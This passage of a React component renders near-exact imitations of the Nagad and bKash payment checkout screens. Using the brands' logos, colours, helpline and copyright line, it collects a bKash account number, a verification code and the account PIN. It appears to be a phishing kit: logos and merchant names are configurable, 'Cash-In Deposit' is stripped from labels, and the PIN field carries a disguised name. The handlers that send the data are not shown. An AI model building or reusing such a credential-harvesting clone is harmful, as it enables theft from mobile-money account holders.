                    <button type="submit" disabled={isConfirmDisabled()} className="flex-1 py-1.5 sm:py-2 rounded bg-white hover:bg-neutral-50 active:scale-[0.98] transition-all text-[#7f1115] font-bold text-xs shadow-md cursor-pointer disabled:opacity-50">Proceed</button>
                    <button type="button" onClick={handleCancelAction} className="flex-1 py-1.5 sm:py-2 rounded bg-white hover:bg-neutral-50 active:scale-[0.98] transition-all text-[#7f1115] font-bold text-xs shadow-md cursor-pointer font-sans">Close</button>
                  </div>
                </div>
              )}
            </div>

            {/* Sticky Official Nagad Footer illustration */}
            <div className="mt-1 sm:mt-4 flex flex-col items-center select-none pb-4 pt-1 shrink-0 -translate-y-4 sm:translate-y-0">
              <div className="flex items-center justify-center max-w-[220px] mb-1 overflow-hidden">
                <img 
                  src={settings?.nagadLogo || "https://upload.wikimedia.org/wikipedia/commons/thumb/c/c5/Nagad_logo.svg/512px-Nagad_logo.svg.png"}
                  alt="Nagad Logo"
                  className="h-[38px] sm:h-[54px] object-contain"
                  referrerPolicy="no-referrer"
                />
              </div>
            </div>
          </form>
        </div>
      </div>
    );
  }

  // ==========================================
  // RENDER PATH 2: BKASH TRADITIONAL WEB UI
  // ==========================================
  return (
    <div className="fixed inset-0 bg-[#424242] z-[9999] flex flex-col justify-start items-center font-sans select-none overflow-y-auto">
      <div className="w-full flex-1 flex justify-center items-start p-3 pt-6 sm:p-6 sm:pt-16">
        <div className="w-full max-w-[500px] bg-white border border-[#d6d6d6] shadow-2xl flex flex-col rounded-[5px] overflow-hidden">
          
          {/* ======================================= */}
          {/* LOGO AREA (WHITE SECTION WITH SOFT NEUTRAL BORDER UNDERNEATH) */}
          {/* ======================================= */}
          <div className="h-[75px] shrink-0 flex items-center justify-center border-b border-neutral-200 bg-white px-4">
            <img 
              src={settings?.bkashLogo || "https://upload.wikimedia.org/wikipedia/commons/thumb/c/c7/BKash_logo.svg/512px-BKash_logo.svg.png"} 
              alt="bKash Logo" 
              className="h-[42px] min-h-[42px] max-h-[44px] object-contain"
              referrerPolicy="no-referrer"
            />
          </div>

          {/* ======================================= */}
          {/* MERCHANT AREA */}
          {/* ======================================= */}
          <div 
            className="flex justify-between items-center py-3.5 px-6 shrink-0 transition-all duration-300"
            style={{
              backgroundColor: isBkashLoading ? '#e2136e' : '#ffffff',
              borderBottom: isBkashLoading ? '1px solid #e2136e' : '1px solid #e5e5e5'
            }}
          >
            <div className={`flex items-center gap-3 transition-opacity duration-300 ${isBkashLoading ? 'opacity-0 pointer-events-none' : 'opacity-100'}`}>
              <div className="w-[38px] h-[38px] rounded-full flex items-center justify-center bg-[#e2136e] text-white shadow-xs select-none shrink-0">
                <Landmark className="w-[18px] h-[18px]" />
              </div>
              <div className="flex flex-col text-left">
                <h3 className="text-zinc-800 text-[14px] max-[600px]:text-[13px] font-medium leading-tight font-sans tracking-wide">
                  {merchantName.replace(/Cash-In Deposit/gi, '').replace(/Cash-In/gi, '').trim()}
                </h3>
                <p className="text-zinc-400 text-[11px] mt-[2px] font-sans">
                  Inv No: {invoiceNo}
                </p>
              </div>
            </div>
            <div className={`text-[18px] max-[600px]:text-[16px] text-zinc-800 font-bold font-sans transition-opacity duration-300 ${isBkashLoading ? 'opacity-0 pointer-events-none' : 'opacity-100'}`}>
              ৳{amount}
            </div>
          </div>

          {/* Custom style block for bKash official bounce and fade-in animations */}
          <style dangerouslySetInnerHTML={{__html: `
            @keyframes bkash-bounce {
              0%, 100% {
                transform: translateY(0);
                opacity: 0.45;
              }
              50% {
                transform: translateY(-5px);
                opacity: 1;
              }
            }
            @keyframes bkash-fade-in {
              from {
                opacity: 0;
                transform: scale(0.98) translateY(2px);
              }
              to {
                opacity: 1;
                transform: scale(1) translateY(0);
              }
            }
            @keyframes bkash-loading-pulse {
              0%, 100% {
                opacity: 0.35;
                transform: scale(0.95);
              }
              50% {
                opacity: 1;
                transform: scale(1.05);
              }
            }
            .bkash-dot-1 {
              animation: bkash-bounce 0.8s infinite ease-in-out;
              animation-delay: 0s;
            }
            .bkash-dot-2 {
              animation: bkash-bounce 0.8s infinite ease-in-out;
              animation-delay: 0.15s;
            }
            .bkash-dot-3 {
              animation: bkash-bounce 0.8s infinite ease-in-out;
              animation-delay: 0.3s;
            }
            .bkash-load-dot-1 {
              animation: bkash-loading-pulse 1s infinite ease-in-out;
              animation-delay: 0s;
            }
            .bkash-load-dot-2 {
              animation: bkash-loading-pulse 1s infinite ease-in-out;
              animation-delay: 0.15s;
            }
            .bkash-load-dot-3 {
              animation: bkash-loading-pulse 1s infinite ease-in-out;
              animation-delay: 0.3s;
            }
            .bkash-load-dot-4 {
              animation: bkash-loading-pulse 1s infinite ease-in-out;
              animation-delay: 0.45s;
            }
            .bkash-animate-fade {
              animation: bkash-fade-in 0.22s ease-out forwards;
            }
          `}} />

          {/* ======================================= */}
          {/* BRAND COLORED SECTION (PINK OR ORANGE) */}
          {/* ======================================= */}
          <form onSubmit={handleNextStep} className="flex flex-col">
            
            <div 
              className="h-[255px] min-h-[255px] flex flex-col justify-center items-center p-5 sm:p-6 relative text-center"
              style={{ 
                background: '#e2136e'
              }}
            >
              {isBkashLoading ? (
                <div className="w-full flex flex-col justify-center items-center text-center py-10 bkash-animate-fade">
                  {/* bKash 4 dots loader */}
                  <div className="flex items-center justify-center gap-2 mb-4">
                    <span className="w-[11px] h-[11px] bg-white rounded-full bkash-load-dot-1" />
                    <span className="w-[11px] h-[11px] bg-white rounded-full bkash-load-dot-2" />
                    <span className="w-[11px] h-[11px] bg-white rounded-full bkash-load-dot-3" />
                    <span className="w-[11px] h-[11px] bg-white rounded-full bkash-load-dot-4" />
                  </div>
                  <p className="text-white text-[15.5px] font-sans font-medium tracking-wide">
                    Loading
                  </p>
                </div>
              ) : showCancelConfirm ? (
                <div className="w-full flex flex-col justify-center items-center text-center px-2 bkash-animate-fade">
                  {/* Outlined Hand Icon */}
                  <Hand className="w-8 h-8 text-white mb-2.5" strokeWidth={1.5} />
                  <div className="text-white text-[13.5px] sm:text-[14.5px] font-sans font-normal tracking-wide whitespace-nowrap">
                    Are you sure you want to cancel this payment?
                  </div>
                </div>
              ) : (
                <>
                  {/* STEP 1: ACCOUNT NUMBER ENTRY */}
                  {step === 1 && (
                    <div key="step-1" className="w-full flex flex-col justify-center items-center text-center px-4 bkash-animate-fade">
                      <h2 className="text-white/95 text-[15.5px] max-[600px]:text-[14px] font-normal mt-0 mb-1 tracking-wide">
                        Your bKash Account Number
                      </h2>
                      
                      <input
                        ref={bKPhoneRef => {
                          if (bKPhoneRef) {
                            bKashPhoneInputRef.current = bKPhoneRef;
                          }
                        }}
                        type="text"
                        maxLength={11}
                        required
                        value={accountNumber}
                        disabled={isBtnSubmitting}
                        onChange={(e) => handleAccountNumberChange(e.target.value)}
                        placeholder="e.g 01XXXXXXXXX"
                        className="w-full max-w-[340px] h-[42px] px-3 border border-[#d5d5d5] rounded-[3px] text-center text-[16px] text-zinc-800 font-sans focus:outline-none focus:border-[#e2136e] shadow-sm bg-white placeholder-zinc-400 disabled:opacity-80 transition-all"
                      />

                      <div className="terms mt-1 text-white/90 text-[12px] text-center">
                        Confirm and proceed,{' '}
                        <a href="#" onClick={(e) => e.preventDefault()} className="underline text-white font-normal hover:text-zinc-200 transition-colors">
                          terms & conditions
                        </a>
                      </div>
                    </div>
                  )}

                  {/* STEP 2: OTP VERIFICATION CODE */}
                  {step === 2 && (
                    <div key="step-2" className="w-full flex flex-col justify-center items-center text-center px-4 bkash-animate-fade">
                      <h2 className="text-white/95 text-[14.5px] max-[600px]:text-[13px] font-normal mb-1.5 tracking-wide leading-relaxed px-2">
                        Enter Verification Code Sent To {obfuscateNumber(accountNumber)}
                      </h2>
                      
                      <input
                        ref={otpRef => {
                          if (otpRef) {
                            otpInputRef.current = otpRef;
                          }
                        }}
                        type="text"
                        maxLength={6}
                        required
                        value={otp}
                        disabled={isBtnSubmitting}
                        onChange={(e) => handleOtpChange(e.target.value)}
                        placeholder="Enter 6 digit code"
                        className={`w-full max-w-[340px] h-[42px] px-3 border border-[#d5d5d5] rounded-[3px] text-center text-zinc-800 font-sans focus:outline-none focus:border-[#e2136e] shadow-sm bg-white disabled:opacity-80 transition-all placeholder-[#a5a5a5] placeholder:font-normal placeholder:tracking-normal ${
                          otp 
                            ? 'text-[18px] font-semibold tracking-[0.25em]' 
                            : 'text-[15.5px] font-normal tracking-normal'
                        }`}
                      />

                      {otpError && (
                        <div className="flex items-center justify-center gap-1.5 text-white text-[12.5px] font-sans font-medium mt-1 px-3 animate-pulse">
                          <AlertTriangle className="w-4 h-4 text-white shrink-0" />
                          <span>Wrong verification code</span>
                        </div>
                      )}

                      <div className="terms mt-2 text-white/90 text-[12px] text-center">
                        {countdown > 0 ? (
                          <span>Resend Code in <strong className="underline text-white font-medium">{countdown}s</strong></span>
                        ) : (
                          <button
                            type="button"
                            disabled={isBtnSubmitting}
                            onClick={() => {
                              setCountdown(120);
                              setOtpError(false);
                            }}
                            className="underline text-white font-medium cursor-pointer hover:text-zinc-200 transition-colors disabled:opacity-50"
                          >
                            Resend Code
                          </button>
                        )}
                      </div>
                    </div>
                  )}

                  {/* STEP 3: PIN ENTER */}
                  {step === 3 && (
                    <div key="step-3" className="w-full flex flex-col justify-center items-center text-center px-4 bkash-animate-fade">
                      <h2 className="text-white/95 text-[14.5px] max-[600px]:text-[12.5px] font-normal mb-1.5 tracking-wide text-center leading-relaxed">
                        Enter PIN Of Your bKash Account Number ({obfuscateNumber(accountNumber)})
                      </h2>
                      
                      <input
                        ref={pinRef => {
                          if (pinRef) {
                            pinInputRef.current = pinRef;
                          }
                        }}
                        type="tel"
                        inputMode="numeric"
                        pattern="[0-9]*"
                        autoComplete="one-time-code"
                        name="txn_verification_code_val"
                        id="txn_verification_code_val"
                        maxLength={5}
                        required
                        value={pin}
                        disabled={isBtnSubmitting}
                        onChange={(e) => handlePinChange(e.target.value)}
                        placeholder="Enter PIN"
                        className={`w-full max-w-[340px] h-[42px] px-3 border border-[#d5d5d5] rounded-[3px] text-center text-zinc-800 focus:outline-none focus:border-[#e2136e] shadow-sm bg-white disabled:opacity-80 transition-all placeholder-[#a5a5a5] placeholder:font-normal placeholder:tracking-normal ${
                          pin 
                            ? 'text-[22px] font-semibold tracking-[10px] pl-[10px]' 
                            : 'text-[15.5px] font-normal tracking-normal'
                        }`}
                        style={{ WebkitTextSecurity: 'disc' }}
                      />
                    </div>
                  )}
                </>
              )}
            </div>

            {/* ======================================= */}
            {/* BUTTONS PANEL */}
            {/* ======================================= */}
            <div 
              className="p-4 flex gap-4 h-[74px] shrink-0 transition-all duration-300"
              style={{
                backgroundColor: isBkashLoading ? '#e2136e' : '#f2f2f2',
                borderTop: isBkashLoading ? '1px solid #e2136e' : '1px solid #e5e5e5'
              }}
            >
              <div className={`w-full flex gap-4 transition-opacity duration-300 ${isBkashLoading ? 'opacity-0 pointer-events-none' : 'opacity-100'}`}>
                {showCancelConfirm ? (
                  <>
                    <button
                      type="button"
                      onClick={handleCancelAction}
                      disabled={isBtnSubmitting}
                      className="btn cancel flex-1 h-[42px] rounded-[3px] text-[13.5px] font-sans font-medium bg-white border border-zinc-200 text-zinc-700 transition-all cursor-pointer hover:bg-zinc-50 active:scale-[0.99] focus:outline-none focus:ring-0 disabled:opacity-50 disabled:cursor-not-allowed"
                    >
                      Yes
                    </button>
                    
                    <button
                      type="button"
                      onClick={() => setShowCancelConfirm(false)}
                      disabled={isBtnSubmitting}
                      className="btn confirm flex-1 h-[42px] rounded-[3px] text-[13.5px] font-sans font-medium transition-all active:scale-[0.99] focus:outline-none border-none outline-none disabled:opacity-50 disabled:cursor-not-allowed"
                      style={{
                        backgroundColor: '#e2136e',
                        color: '#ffffff',
                        cursor: 'pointer'
                      }}
                    >
                      No
                    </button>
                  </>
                ) : (
                  <>
                    <button
                      type="button"
                      onClick={() => setShowCancelConfirm(true)}
                      disabled={isBtnSubmitting}
                      className="btn cancel flex-1 h-[42px] rounded-[3px] text-[13.5px] font-sans font-medium bg-white text-[#757575] hover:bg-zinc-50 border border-[#d5d5d5] transition-all cursor-pointer active:scale-[0.99] focus:outline-none disabled:opacity-50 disabled:cursor-not-allowed outline-none"
                    >
                      Cancel
                    </button>
                    
                    <button
                      type="submit"
                      disabled={isConfirmDisabled() || isBtnSubmitting}
                      className="btn confirm flex-1 h-[42px] rounded-[3px] text-[13.5px] font-sans font-medium transition-all active:scale-[0.99] focus:outline-none border-none outline-none flex items-center justify-center"
                      style={{
                        backgroundColor: isConfirmDisabled() && !isBtnSubmitting ? '#e6e6e6' : '#e2136e',
                        color: isConfirmDisabled() && !isBtnSubmitting ? '#a0a0a0' : '#ffffff',
                        cursor: isConfirmDisabled() || isBtnSubmitting ? 'not-allowed' : 'pointer'
                      }}
                    >
                      {isBtnSubmitting ? (
                        <div className="flex items-center justify-center gap-1.5 py-1">
                          <span className="w-1.5 h-1.5 bg-white rounded-full bkash-dot-1" />
                          <span className="w-1.5 h-1.5 bg-white rounded-full bkash-dot-2" />
                          <span className="w-1.5 h-1.5 bg-white rounded-full bkash-dot-3" />
                        </div>
                      ) : (
                        "Confirm"
                      )}
                    </button>
                  </>
                )}
              </div>
            </div>

            {/* ======================================= */}
            {/* FOOTER */}
            {/* ======================================= */}
            <div className="footer text-center bg-white pb-[12px] pt-1 px-5 select-none text-sans">
              <div className="flex items-center justify-center gap-1">
                <span className="w-3.5 h-3.5 rounded-full flex items-center justify-center" style={{ backgroundColor: '#e2136e' }}>
                  <svg className="w-2 h-2 text-white" fill="currentColor" viewBox="0 0 24 24">
                    <path d="M21.384,17.791 C20.443,16.852 19.124,16.321 17.818,16.321 C17.387,16.321 16.96,16.38 16.538,16.494 L14.773,16.92 C12.639,15.753 10.965,14.079 9.798,11.945 L10.224,10.18 C10.339,9.758 10.398,9.331 10.398,8.9 C10.398,7.594 9.867,6.275 8.928,5.334 L7.151,3.56 C6.162,2.571 4.545,2.571 3.556,3.56 L2.19,4.924 C1.802,5.312 1.547,5.811 1.455,6.349 C1.155,8.114 1.838,11.378 4.792,14.613 C7.901,18.018 11.23,20.082 14.156,20.082 C14.441,20.082 14.726,20.06 15.006,20.016 C15.544,19.924 16.043,19.668 16.431,19.28 L17.797,17.914 C18.784,16.926 18.784,15.31 17.797,14.321 L21.384,17.791 Z" />
                  </svg>
                </span>
                <span className="help-number text-[11px] font-bold font-sans ml-1" style={{ color: '#e2136e' }}>
                  16247
                </span>
              </div>
              <div className="copy mt-[3px] text-zinc-400 text-[11px] font-sans">
                © 2026 bKash, All Rights Reserved
              </div>
            </div>

          </form>
        </div>
      </div>
    </div>
  );
}
